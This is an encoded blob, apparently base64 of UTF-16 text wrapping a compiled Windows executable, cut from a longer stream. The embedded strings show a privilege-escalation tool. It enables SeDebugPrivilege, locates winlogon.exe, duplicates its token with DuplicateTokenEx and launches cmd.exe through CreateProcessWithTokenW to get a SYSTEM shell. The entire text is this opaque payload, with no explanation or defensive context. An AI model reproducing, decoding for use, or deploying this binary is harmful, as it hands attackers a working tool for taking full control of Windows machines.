BBAEEAQQBkAEEATwB3AEEAYwBNAHkAdwBNAE4AbwBJAEMAZABBAEEAUAA4AFYAUQBEAEIAQQBBAE0ATgBWAGkAKwB5AEwAUgBRAGkATABBAEkARQA0AFkAMwBOAHQANABIAFUAbABnADMAZwBRAEEAMwBVAGYAaQAwAEEAVQBQAFMAQQBGAGsAeABsADAARwB6ADAAaABCAFoATQBaAGQAQgBRADkASQBnAFcAVABHAFgAUQBOAFAAUQBCAEEAbQBRAEYAMABCAGoAUABBAFgAYwBJAEUAQQBPAGkAQQBBAHcAQQBBAHoASQBNAGwANABGAE4AQQBBAEEARABEAFUAMQBhACsARwBEAHQAQQBBAEwAcwBZAE8AMABBAEEATwAvAE4AegBHAFYAZQBMAFAAbwBYAC8AZABBAHEATAB6AC8AOABWAEsARABGAEEAQQBQAC8AWABnADgAWQBFAE8ALwBOAHkANgBWADkAZQBXADgATgBUAFYAcgA0AGcATwAwAEEAQQB1AHkAQQA3AFEAQQBBADcAOAAzAE0AWgBWADQAcwArAGgAZgA5ADAAQwBvAHYAUAAvAHgAVQBvAE0AVQBBAEEALwA5AGUARAB4AGcAUQA3ADgAMwBMAHAAWAAxADUAYgB3ADgAegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBHAGcAcgBLAEUAQQBBAFoAUAA4ADEAQQBBAEEAQQBBAEkAdABFAEoAQgBDAEoAYgBDAFEAUQBqAFcAdwBrAEUAQwB2AGcAVQAxAFoAWABvAFEAUgBRAFEAQQBBAHgAUgBmAHcAegB4AFYAQwBKAFoAZQBqAC8AZABmAGkATABSAGYAegBIAFIAZgB6ACsALwAvAC8ALwBpAFUAWAA0AGoAVQBYAHcAWgBLAE0AQQBBAEEAQQBBADgAcwBPAEwAVABmAEIAawBpAFEAMABBAEEAQQBBAEEAVwBWADkAZgBYAGwAdQBMADUAVgAxAFIAOABzAE4AVgBpACsAeABXAGkAMwBVAEkALwB6AGIAbwBzAHcASQBBAEEAUAA5ADEARgBJAGsARwAvADMAVQBRAC8AMwBVAE0AVgBtAGgAUQBIAFUAQQBBAGEAQQBSAFEAUQBBAEQAbwA2AGcARQBBAEEASQBQAEUASABGADUAZAB3ADEAVwBMADcAUABaAEYAQwBBAEYAVwBpAC8ASABIAEIAcwB3AHgAUQBBAEIAMABDAG0AbwBNAFYAdQBnAGQAOQBmAC8ALwBXAFYAbQBMAHgAbAA1AGQAdwBnAFEAQQBWAFkAdgBzAGcAeQBYAGsAVQAwAEEAQQBBAEkAUABzAEoARgBNAHoAMgAwAE0ASgBIAFIAQgBRAFEAQQBCAHEAQwB1AGgATABBAGcAQQBBAGgAYwBBAFAAaABHAHcAQgBBAEEAQwBEAFoAZgBBAEEATQA4AEMARABEAFIAQgBRAFEAQQBBAEMATQA4AGwAVwBWADQAawBkADUARgBOAEEAQQBJADEAOQAzAEYATQBQAG8AbwB2AHoAVwA0AGsASABpAFgAYwBFAGkAVQA4AEkATQA4AG0ASgBWAHcAeQBMAFIAZAB5AEwAZgBlAEMASgBSAGYAUwBCADkAMABkAGwAYgBuAFcATABSAGUAZwAxAGEAVwA1AGwAUwBZAGwARgArAEkAdABGADUARABWAHUAZABHAFYAcwBpAFUAWAA4AE0AOABCAEEAVQB3ACsAaQBpAC8ATgBiAGoAVgAzAGMAaQBRAE8ATABSAGYAdwBMAFIAZgBnAEwAeAA0AGwAegBCAEkAbABMAEMASQBsAFQARABIAFYARABpADAAWABjAEoAZgBBAC8ALwB3ADgAOQB3AEEAWQBCAEEASABRAGoAUABXAEEARwBBAGcAQgAwAEgARAAxAHcAQgBnAEkAQQBkAEIAVQA5AFUAQQBZAEQAQQBIAFEATwBQAFcAQQBHAEEAdwBCADAAQgB6ADEAdwBCAGcATQBBAGQAUgBHAEwAUABlAGgAVABRAEEAQwBEAHoAdwBHAEoAUABlAGgAVABRAEEARAByAEIAbwBzADkANgBGAE4AQQBBAEkATgA5ADkAQQBlAEwAUgBlAFMASgBSAGYAeAA4AE0AbQBvAEgAVwBEAFAASgBVAHcAKwBpAGkALwBOAGIAagBWADMAYwBpAFEATwBMAFIAZgB5AEoAYwB3AFMASgBTAHcAaQBKAFUAdwB5AEwAWABlAEQAMwB3AHcAQQBDAEEAQQBCADAARABvAFAAUABBAG8AawA5ADYARgBOAEEAQQBPAHMARABpADEAMwB3AFgAMQA2AHAAQQBBAEEAUQBBAEgAUgBtAGcAdwAwAFEAVQBFAEEAQQBCAE0AYwBGADUARgBOAEEAQQBBAEkAQQBBAEEAQwBwAEEAQQBBAEEAQwBIAFIATwBxAFEAQQBBAEEAQgBCADAAUgB6AFAASgBEAHcASABRAGkAVQBYAHMAaQBWAFgAdwBpADAAWABzAGkAMAAzAHcAZwArAEEARwBnAC8AZwBHAGQAUwA2AGgARQBGAEIAQQBBAEkAUABJAEMATQBjAEYANQBGAE4AQQBBAEEATQBBAEEAQQBDAGoARQBGAEIAQQBBAFAAYgBEAEkASABRAFMAZwA4AGcAZwB4AHcAWABrAFUAMABBAEEAQgBRAEEAQQBBAEsATQBRAFUARQBBAEEATQA4AEIAYgB5AGMATQB6AHcARABrAEYARgBGAEIAQQBBAEEAKwBWAHcATQBQAC8ASgBZAFEAdwBRAEEARAAvAEoAWQBBAHcAUQBBAEQALwBKAFkAZwB3AFEAQQBEAC8ASgBYAGcAdwBRAEEARAAvAEoAWQB3AHcAUQBBAEQALwBKAFgAdwB3AFEAQQBEAC8ASgBhAGcAdwBRAEEARAAvAEoAYQBBAHcAUQBBAEQALwBKAFEAZwB4AFEAQQBEAC8ASgBRAFEAeABRAEEARAAvAEoAYgBnAHcAUQBBAEQALwBKAGYAdwB3AFEAQQBEAC8ASgBmAGcAdwBRAEEARAAvAEoAZgBRAHcAUQBBAEQALwBKAGYAQQB3AFEAQQBEAC8ASgBRAHcAeABRAEEARAAvAEoAUQBBAHgAUQBBAEQALwBKAGUAZwB3AFEAQQBEAC8ASgBSAHcAeABRAEEARAAvAEoAZQBRAHcAUQBBAEQALwBKAGUAQQB3AFEAQQBEAC8ASgBjAGcAdwBRAEEARAAvAEoAYwBRAHcAUQBBAEQALwBKAGUAdwB3AFEAQQBEAC8ASgBiAEEAdwBRAEEARAAvAEoAWgB3AHcAUQBBAEQALwBKAFMAQQB4AFEAQQBEAC8ASgBhAFEAdwBRAEEARAAvAEoAYwB3AHcAUQBBAEQALwBKAGQAQQB3AFEAQQBEAC8ASgBkAFEAdwBRAEEARAAvAEoAZABnAHcAUQBBAEQALwBKAGQAdwB3AFEAQQBEAC8ASgBVAGcAdwBRAEEAQgBWAGkAKwB4AFIAZwB6ADMAawBVADAAQQBBAEEAWAB4AG0AZwBYADAASQB0AEEASQBBAHcASABRAEoAZwBYADAASQB0AFEASQBBAHcASABWAFUARAA2ADUAZAAvAEkAdABGAC8ASQBQAHcAUAA2AGkAQgBkAEQAKwBwAEIAQQBJAEEAQQBIAFUASAB1AEkANABBAEEATQBEAEoAdwA2AGsAQwBBAFEAQQBBAGQAQwBxAHAAQwBBAFEAQQBBAEgAVQBIAHUASgBFAEEAQQBNAEQASgB3ADYAawBRAEMAQQBBAEEAZABRAGUANABrAHcAQQBBAHcATQBuAEQAcQBTAEEAUQBBAEEAQgAxAEQAcgBpAFAAQQBBAEQAQQB5AGMATwA0AGsAQQBBAEEAdwBNAG4ARABpADAAVQBJAHkAYwBQAC8ASgBaAEEAdwBRAEEARAAvAEoAWgBRAHcAUQBBAEMATgBqAGMAegA5AC8ALwAvAHAANQBlAHoALwAvADQAMgBOAHYAUAAzAC8ALwArAGwANgA4AGYALwAvAGkAMQBRAGsAQwBJADEAQwBEAEkAdQBLAHUAUAAzAC8ALwB6AFAASQA2AEwAYgB4AC8ALwArAEwAUwB2AHcAegB5AE8AaQBzADgAZgAvAC8AdQBDAGcANwBRAEEARABwAGMAdgA3AC8ALwA4AHoATQBqAFUAMwBZADYAYQBqAHMALwAvACsATABWAEMAUQBJAGoAVQBJAE0AaQA0AHAAZwAvAC8ALwAvAE0AOABqAG8AaABQAEgALwAvADQAdABLAC8ARABQAEkANgBIAHIAeAAvAC8AKwA0AFgARAB0AEEAQQBPAGwAQQAvAHYALwAvAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAbQBQAHcAQQBBAFQAagA4AEEAQQBEADQALwBBAEEAQQBrAFAAdwBBAEEAQwBqADgAQQBBAFAAWQArAEEAQQBEAG0AUABnAEEAQQAwAGoANABBAEEAQQBBAEEAQQBBAEMAMgBQAGcAQQBBAHAARAA0AEEAQQBKAEkAKwBBAEEAQwBDAFAAZwBBAEEAWgBqADQAQQBBAEYAZwArAEEAQQBCAEUAUABnAEEAQQBRAEUATQBBAEEARgA1AEQAQQBBAEIAeQBRAHcAQQBBAGoAawBNAEEAQQBDAFIARABBAEEAQwBvAFEAdwBBAEEAdgBrAE0AQQBBAE4AUgBEAEEAQQBEAHUAUQB3AEEAQQBCAEUAUQBBAEEAQgBoAEUAQQBBAEEAQQBBAEEAQQBBAGoARAA4AEEAQQBBAEEAQQBBAEEAQQBDAFEAQQBBAEEASQBrAEEAQQBBAE4AQQAvAEEAQQBDADYAUAB3AEEAQQA2AEQAOABBAEEAQgBoAEEAQQBBAEEAcwBSAEEAQQBBAE4AawBRAEEAQQBBAEEAQQBBAEEARAAyAFEAUQBBAEEAcgBFAEEAQQBBAEIAWgBDAEEAQQBDAGcAUQBBAEEAQQBBAEEAQQBBAEEATwBCAEIAQQBBAEEAQQBBAEEAQQBBADIARQBBAEEAQQBBAEEAQQBBAEEAQgA2AFEAQQBBAEEAcQBFAEUAQQBBAEoANQBCAEEAQQBBAGUAUQBnAEEAQQBPAGsASQBBAEEARgBaAEMAQQBBAEIAawBRAGcAQQBBAGQARQBJAEEAQQBKAEIAQgBBAEEAQwBDAFEAUQBBAEEAYgBFAEUAQQBBAEwASgBCAEEAQQBCAEsAUQBRAEEAQQBLAEUARQBBAEEAQQBaAEIAQQBBAEQAcwBRAEEAQQBBAFoARQBFAEEAQQBNAGgAQQBBAEEAQwAyAFEAQQBBAEEAVgBrAEUAQQBBAEEAQQBBAEEAQQBCAGcAUQBBAEEAQQBUAGsAQQBBAEEASABSAEIAQQBBAEEARwBRAGcAQQBBAEEAQQBBAEEAQQBIAFkAbABRAEEAQQBBAEEAQQBBAEEAVQBoADUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBuAHgAMQBBAEEARQBvAGUAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBrAEYAQgBBAEEATwBCAFEAUQBBAEQAawBOAGsAQQBBAHQAQwBGAEEAQQBCAHMAaQBRAEEAQgBWAGIAbQB0AHUAYgAzAGQAdQBJAEcAVgA0AFkAMgBWAHcAZABHAGwAdgBiAGcAQQBBAEEAQwB3ADMAUQBBAEMAMABJAFUAQQBBAEcAeQBKAEEAQQBHAEoAaABaAEMAQgBoAGIARwB4AHYAWQAyAEYAMABhAFcAOQB1AEEAQQBCADQATgAwAEEAQQB0AEMARgBBAEEAQgBzAGkAUQBBAEIAaQBZAFcAUQBnAFkAWABKAHkAWQBYAGsAZwBiAG0AVgAzAEkARwB4AGwAYgBtAGQAMABhAEEAQQBBAEEAQQBEAEkATgAwAEEAQQBXAGkAaABBAEEARgBzAHQAWABTAEIATQBiADIAOQByAGQAWABCAFEAYwBtAGwAMgBhAFcAeABsAFoAMgBWAFcAWQBXAHgAMQBaAFMAQgBsAGMAbgBKAHYAYwBqAG8AZwBKAFgAVQBLAEEARgBzAHQAWABTAEIAQgBaAEcAcAAxAGMAMwBSAFUAYgAyAHQAbABiAGwAQgB5AGEAWABaAHAAYgBHAFYAbgBaAFgATQBnAFoAWABKAHkAYgAzAEkANgBJAEMAVgAxAEMAZwBBAEEAQQBBAEIAYgBMAFYAMABnAFYARwBoAGwASQBIAFIAdgBhADIAVgB1AEkARwBSAHYAWgBYAE0AZwBiAG0AOQAwAEkARwBoAGgAZABtAFUAZwBkAEcAaABsAEkASABOAHcAWgBXAE4AcABaAG0AbABsAFoAQwBCAHcAYwBtAGwAMgBhAFcAeABsAFoAMgBVAHUASQBBAG8AQQBBAEYAcwByAFgAUwBCAEQAZABYAEoAeQBaAFcANQAwAEkASABWAHoAWgBYAEkAZwBhAFgATQA2AEkAQwBWAHoAQwBnAEEAQQBBAEEAQgAzAEEARwBrAEEAYgBnAEIAcwBBAEcAOABBAFoAdwBCAHYAQQBHADQAQQBMAGcAQgBsAEEASABnAEEAWgBRAEEAQQBBAEEAQQBBAFcAeQBGAGQASQBGAE4AbABZAFgASgBqAGEARwBsAHUAWgB5AEIAbQBiADMASQBnAFYAMgBsAHUAVABHADkAbgBiADIANABnAFUARQBsAEUASQBRAG8AQQBBAEEAQQBBAFcAeQBGAGQASQBFAFoAdgBkAFcANQBrAEkARgBkAHAAYgBtAHgAdgBaADIAOQB1AEkARgBCAHkAYgAyAE4AbABjADMATQBnAFMAVQBRADYASQBDAFYAcwBaAEEAbwBBAFUAdwBCAGwAQQBFAFEAQQBaAFEAQgBpAEEASABVAEEAWgB3AEIAUQBBAEgASQBBAGEAUQBCADIAQQBHAGsAQQBiAEEAQgBsAEEARwBjAEEAWgBRAEEAQQBBAEEAQQBBAFcAeQB0AGQASQBGAE4AbABSAEcAVgBpAGQAVwBkAFEAYwBtAGwAMgBhAFcAeABsAFoAMgBVAGcAWgBXADUAaABZAG0AeABsAFoAQwBFAEsAQQBBAEIAYgBLADEAMABnAFQAMwBCAGwAYgBsAEIAeQBiADIATgBsAGMAMwBNAG8ASwBTAEIAegBkAFcATgBqAFoAWABOAHoASQBRAG8AQQBXAHkAMQBkAEkARQA5AHcAWgBXADUAUQBjAG0AOQBqAFoAWABOAHoASwBDAGsAZwBVAG0AVgAwAGQAWABKAHUASQBFAE4AdgBaAEcAVQA2AEkAQwBWAHAAQwBnAEEAQQBXAHkAMQBkAEkARQA5AHcAWgBXADUAUQBjAG0AOQBqAFoAWABOAHoASwBDAGsAZwBSAFgASgB5AGIAMwBJADYASQBDAFYAcABDAGcAQQBBAEEAQQBCAGIASwAxADAAZwBUADMAQgBsAGIAbABCAHkAYgAyAE4AbABjADMATgBVAGIAMgB0AGwAYgBpAGcAcABJAEgATgAxAFkAMgBOAGwAYwAzAE0AaABDAGcAQQBBAEEAQQBCAGIATABWADAAZwBUADMAQgBsAGIAbABCAHkAYgAyAE4AbABjADMATgBVAGIAMgB0AGwAYgBpAGcAcABJAEYASgBsAGQASABWAHkAYgBpAEIARABiADIAUgBsAE8AaQBBAGwAYQBRAG8AQQBXAHkAMQBkAEkARQA5AHcAWgBXADUAUQBjAG0AOQBqAFoAWABOAHoAVgBHADkAcgBaAFcANABvAEsAUwBCAEYAYwBuAEoAdgBjAGoAbwBnAEoAVwBrAEsAQQBBAEEAQQBXAHkAdABkAEkARQBsAHQAYwBHAFYAeQBjADIAOQB1AFkAWABSAGwAWgBFAHgAdgBaADIAZABsAFoARQA5AHUAVgBYAE4AbABjAGkAZwBwAEkASABOADEAWQAyAE4AbABjADMATQBoAEMAZwBBAEEAQQBBAEIAYgBLADEAMABnAFUAbQBWADIAWgBYAEoAMABhAFcANQBuAEkASABSAG8AYwBtAFYAaABaAEMAQgAwAGIAeQBCAHYAYwBtAGwAbgBhAFcANQBoAGIAQwBCADEAYwAyAFYAeQBJAEcATgB2AGIAbgBSAGwAZQBIAFEASwBBAEEAQgBiAEwAVgAwAGcAUwBXADEAdwBaAFgASgB6AGIAMgA1AGgAZABHAFYAawBUAEcAOQBuAFoAMgBWAGsAVAAyADUAVgBjADIAVgB5AEsAQwBrAGcAVQBtAFYAMABkAFgASgB1AEkARQBOAHYAWgBHAFUANgBJAEMAVgBwAEMAZwBCAGIATABWADAAZwBTAFcAMQB3AFoAWABKAHoAYgAyADUAaABkAEcAVgBrAFQARwA5AG4AWgAyAFYAawBUADIANQBWAGMAMgBWAHkASwBDAGsAZwBSAFgASgB5AGIAMwBJADYASQBDAFYAcABDAGcAQQBBAEEARgBzAHIAWABTAEIARQBkAFgAQgBzAGEAVwBOAGgAZABHAFYAVQBiADIAdABsAGIAawBWADQASwBDAGsAZwBjADMAVgBqAFkAMgBWAHoAYwB5AEUASwBBAEEAQQBBAEEARgBzAHQAWABTAEIARQBkAFgAQgBzAGEAVwBOAGgAZABHAFYAVQBiADIAdABsAGIAawBWADQASwBDAGsAZwBVAG0AVgAwAGQAWABKAHUASQBFAE4AdgBaAEcAVQA2AEkAQwBWAHAAQwBnAEIAYgBMAFYAMABnAFIASABWAHcAYQBXAE4AaABkAEcAVgBVAGIAMgB0AGwAYgBrAFYANABLAEMAawBnAFIAWABKAHkAYgAzAEkANgBJAEMAVgBwAEMAZwBBAEEAQQBBAEIARABBAEQAbwBBAFgAQQBCAFgAQQBHAGsAQQBiAGcAQgBrAEEARwA4AEEAZAB3AEIAegBBAEYAdwBBAFUAdwBCADUAQQBIAE0AQQBkAEEAQgBsAEEARwAwAEEATQB3AEEAeQBBAEYAdwBBAFkAdwBCAHQAQQBHAFEAQQBMAGcAQgBsAEEASABnAEEAWgBRAEEAQQBBAEYAcwByAFgAUwBCAFEAYwBtADkAagBaAFgATgB6AEkASABOAHcAWQBYAGQAdQBaAFcAUQBoAEMAZwBBAEEAQQBGAHMAdABYAFMAQgBEAGMAbQBWAGgAZABHAFYAUQBjAG0AOQBqAFoAWABOAHoAVgAyAGwAMABhAEYAUgB2AGEAMgBWAHUAVgB5AEIAUwBaAFgAUgAxAGMAbQA0AGcAUQAyADkAawBaAFQAbwBnAEoAVwBrAEsAQQBBAEEAQQBBAEYAcwB0AFgAUwBCAEQAYwBtAFYAaABkAEcAVgBRAGMAbQA5AGoAWgBYAE4AegBWADIAbAAwAGEARgBSAHYAYQAyAFYAdQBWAHkAQgBGAGMAbgBKAHYAYwBqAG8AZwBKAFcAawBLAEEAQQBCAHoAZABIAEoAcABiAG0AYwBnAGQARwA5AHYASQBHAHgAdgBiAG0AYwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARwBOAE8AQQBYAGcAQQBBAEEAQQBBAEMAQQBBAEEAQQBYAEEAQQBBAEEAQgB3ADQAQQBBAEEAYwBLAEEAQQBBAEEAQQBBAEEAQQBCAGoAVABnAEYANABBAEEAQQBBAEEARABBAEEAQQBBAEIAUQBBAEEAQQBCADQATwBBAEEAQQBlAEMAZwBBAEEAQQBBAEEAQQBBAEEAWQAwADQAQgBlAEEAQQBBAEEAQQBBADAAQQBBAEEAQwBJAEEAZwBBAEEAagBEAGcAQQBBAEkAdwBvAEEAQQBBAEEAQQBBAEEAQQBHAE4ATwBBAFgAZwBBAEEAQQBBAEEATwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAcABBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIARgBCAEEAQQBCAEEANABRAEEAQQBEAEEAQQBBAEEASwBEAEYAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQAwAFUARQBBAEEAKwBEAFoAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFEAQQBBAEEAQQBnADMAUQBBAEEAUQBOADAAQQBBAEEAQQBBAEEAQQBEAFIAUQBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFAALwAvAC8ALwA4AEEAQQBBAEEAQQBRAEEAQQBBAEEAUABnADIAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBZAFUARQBBAEEAUQBEAGQAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAGcAQQBBAEEARgBBADMAUQBBAEIAYwBOADAAQQBBAEUARABkAEEAQQBBAEEAQQBBAEEAQQBZAFUARQBBAEEAQQBRAEEAQQBBAEEAQQBBAEEAQQBEAC8ALwAvAC8ALwBBAEEAQQBBAEEARQBBAEEAQQBBAEIAQQBOADAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAVQBGAEIAQQBBAEkAdwAzAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBNAEEAQQBBAEMAYwBOADAAQQBBAHIARABkAEEAQQBGAHcAMwBRAEEAQQBRAE4AMABBAEEAQQBBAEEAQQBBAEYAQgBRAFEAQQBBAEMAQQBBAEEAQQBBAEEAQQBBAEEAUAAvAC8ALwAvADgAQQBBAEEAQQBBAFEAQQBBAEEAQQBJAHcAMwBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCADQAVQBFAEEAQQAzAEQAZABBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUQBBAEEAQQBPAHcAMwBRAEEARAAwAE4AMABBAEEAQQBBAEEAQQBBAEgAaABRAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUAAvAC8ALwAvADgAQQBBAEEAQQBBAFEAQQBBAEEAQQBOAHcAMwBRAEEAQQByAEsAQQBBAEEAaABpAHMAQQBBAEwAZwByAEEAQQBCAFMAVQAwAFIAVABQAFcAaABiAGQAUQBaAG8AMwBVAG0AZQBmAEIANABrAG4AYQBxADgAeQBnAEUAQQBBAEEAQgBEAE8AbAB4AFYAYwAyAFYAeQBjADEAeABoAFoARwAxAHAAYgBsAHgAegBiADMAVgB5AFkAMgBWAGMAYwBtAFYAdwBiADMATgBjAFUASABKAHYAWQAyAFYAegBjADAAaABoAGIAbQBSAHMAWgBWAHgAUwBaAFcAeABsAFkAWABOAGwAWABGAEIAeQBiADIATgBsAGMAMwBOAEkAWQBXADUAawBiAEcAVQB1AGMARwBSAGkAQQBBAEEAQQBBAEEAQQBsAEEAQQBBAEEASgBRAEEAQQBBAEEARQBBAEEAQQBBAGsAQQBBAEEAQQBSADAATgBVAFQAQQBBAFEAQQBBAEIAdwBHAHcAQQBBAEwAbgBSAGwAZQBIAFEAawBiAFcANABBAEEAQQBBAEEAYwBDAHMAQQBBAEgAQQBBAEEAQQBBAHUAZABHAFYANABkAEMAUgA0AEEAQQBBAHcAQQBBAEEAbwBBAFEAQQBBAEwAbQBsAGsAWQBYAFIAaABKAEQAVQBBAEEAQQBBAEEASwBEAEUAQQBBAEEAUQBBAEEAQQBBAHUATQBEAEIAagBaAG0AYwBBAEEAQwB3AHgAQQBBAEEARQBBAEEAQQBBAEwAawBOAFMAVgBDAFIAWQBRADAARQBBAEEAQQBBAEEATQBEAEUAQQBBAEEAUQBBAEEAQQBBAHUAUQAxAEoAVQBKAEYAaABEAFEAVQBFAEEAQQBBAEEAMABNAFEAQQBBAEIAQQBBAEEAQQBDADUARABVAGwAUQBrAFcARQBOAGEAQQBBAEEAQQBBAEQAZwB4AEEAQQBBAEUAQQBBAEEAQQBMAGsATgBTAFYAQwBSAFkAUwBVAEUAQQBBAEEAQQBBAFAARABFAEEAQQBBAFEAQQBBAEEAQQB1AFEAMQBKAFUASgBGAGgASgBRAFUARQBBAEEAQQBCAEEATQBRAEEAQQBCAEEAQQBBAEEAQwA1AEQAVQBsAFEAawBXAEUAbABCAFEAdwBBAEEAQQBFAFEAeABBAEEAQQBFAEEAQQBBAEEATABrAE4AUwBWAEMAUgBZAFMAVgBvAEEAQQBBAEEAQQBTAEQARQBBAEEAQQBRAEEAQQBBAEEAdQBRADEASgBVAEoARgBoAFEAUQBRAEEAQQBBAEEAQgBNAE0AUQBBAEEAQgBBAEEAQQBBAEMANQBEAFUAbABRAGsAVwBGAEIAYQBBAEEAQQBBAEEARgBBAHgAQQBBAEEARQBBAEEAQQBBAEwAawBOAFMAVgBDAFIAWQBWAEUARQBBAEEAQQBBAEEAVgBEAEUAQQBBAEEAdwBBAEEAQQBBAHUAUQAxAEoAVQBKAEYAaABVAFcAZwBBAEEAQQBBAEIAZwBNAFEAQQBBAGgAQQBVAEEAQQBDADUAeQBaAEcARgAwAFkAUQBBAEEANQBEAFkAQQBBAEMAdwBCAEEAQQBBAHUAYwBtAFIAaABkAEcARQBrAGMAZwBBAEEAQQBBAEEAUQBPAEEAQQBBAEQAQQBBAEEAQQBDADUAeQBaAEcARgAwAFkAUwBSAHoAZQBHAFIAaABkAEcARQBBAEEAQQBBAGMATwBBAEEAQQArAEEASQBBAEEAQwA1AHkAWgBHAEYAMABZAFMAUgA2AGUAbgBwAGsAWQBtAGMAQQBBAEEAQQBVAE8AdwBBAEEAQgBBAEEAQQBBAEMANQB5AGQARwBNAGsAUwBVAEYAQgBBAEEAQQBBAEEAQgBnADcAQQBBAEEARQBBAEEAQQBBAEwAbgBKADAAWQB5AFIASgBXAGwAbwBBAEEAQQBBAEEASABEAHMAQQBBAEEAUQBBAEEAQQBBAHUAYwBuAFIAagBKAEYAUgBCAFEAUQBBAEEAQQBBAEEAZwBPAHcAQQBBAEMAQQBBAEEAQQBDADUAeQBkAEcATQBrAFYARgBwAGEAQQBBAEEAQQBBAEMAZwA3AEEAQQBBAHMAQQBRAEEAQQBMAG4AaABrAFkAWABSAGgASgBIAGcAQQBBAEEAQQBBAFYARAB3AEEAQQBMAFEAQQBBAEEAQQB1AGEAVwBSAGgAZABHAEUAawBNAGcAQQBBAEEAQQBBAEkAUABRAEEAQQBGAEEAQQBBAEEAQwA1AHAAWgBHAEYAMABZAFMAUQB6AEEAQQBBAEEAQQBCAHcAOQBBAEEAQQBvAEEAUQBBAEEATABtAGwAawBZAFgAUgBoAEoARABRAEEAQQBBAEEAQQBSAEQANABBAEEAUAB3AEYAQQBBAEEAdQBhAFcAUgBoAGQARwBFAGsATgBnAEEAQQBBAEEAQQBBAFUAQQBBAEEARwBBAEEAQQBBAEMANQBrAFkAWABSAGgAQQBBAEEAQQBHAEYAQQBBAEEASABnAEEAQQBBAEEAdQBaAEcARgAwAFkAUwBSAHkAQQBKAEIAUQBBAEEAQgB3AEEAdwBBAEEATABtAEoAegBjAHcAQQBBAEEAQQBBAEEAWQBBAEEAQQBZAEEAQQBBAEEAQwA1AHkAYwAzAEoAagBKAEQAQQB4AEEAQQBBAEEAQQBHAEIAZwBBAEEAQwBBAEEAUQBBAEEATABuAEoAegBjAG0ATQBrAE0ARABJAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBpAEIAWgBNAFoAQQBnAEEAQQBBAEUAdwA3AFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEUAQQBBAEEARAAvAC8ALwAvAC8AYwBDAHQAQQBBAEEAQQBBAEEAQQBCADcASwAwAEEAQQBJAGcAVwBUAEcAUQBFAEEAQQBBAEMAQQBPADAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAQQBBAEEAQQAvAC8ALwAvAC8ANwBBAHIAUQBBAEQAKwAvAC8ALwAvAEEAQQBBAEEAQQBNAHoALwAvAC8AOABBAEEAQQBBAEEALwB2AC8ALwAvADQAcwBmAFEAQQBDAGYASAAwAEEAQQBBAEEAQQBBAEEASwBNAGgAUQBBAEEAQQBBAEEAQQBBAHQARAB0AEEAQQBBAEkAQQBBAEEARABBAE8AMABBAEEAMwBEAHQAQQBBAEIAQQBBAEEAQQBBAFkAVQBFAEEAQQBBAEEAQQBBAEEAUAAvAC8ALwAvADgAQQBBAEEAQQBBAEQAQQBBAEEAQQBCAEUAaABRAEEAQQBBAEEAQQBBAEEATgBGAEIAQQBBAEEAQQBBAEEAQQBEAC8ALwAvAC8ALwBBAEEAQQBBAEEAQQB3AEEAQQBBAEIAMwBJAFUAQQBBAEEAQQBBAEEAQQBLAE0AaABRAEEAQQBBAEEAQQBBAEEAQwBEAHgAQQBBAEEATQBBAEEAQQBBAFkAUABFAEEAQQB3AEQAdABBAEEATgB3ADcAUQBBAEEAQQBBAEEAQQBBAFUARgBCAEEAQQBBAEEAQQBBAEEARAAvAC8ALwAvAC8AQQBBAEEAQQBBAEEAdwBBAEEAQQBCAEUASQBVAEEAQQBBAEEAQQBBAEEAUAA3AC8ALwAvADgAQQBBAEEAQQBBADIAUAAvAC8ALwB3AEEAQQBBAEEARAArAC8ALwAvAC8AMwBTAE4AQQBBAFAAQQBqAFEAQQBCAEEAUABRAEEAQQBBAEEAQQBBAEEAQQBBAEE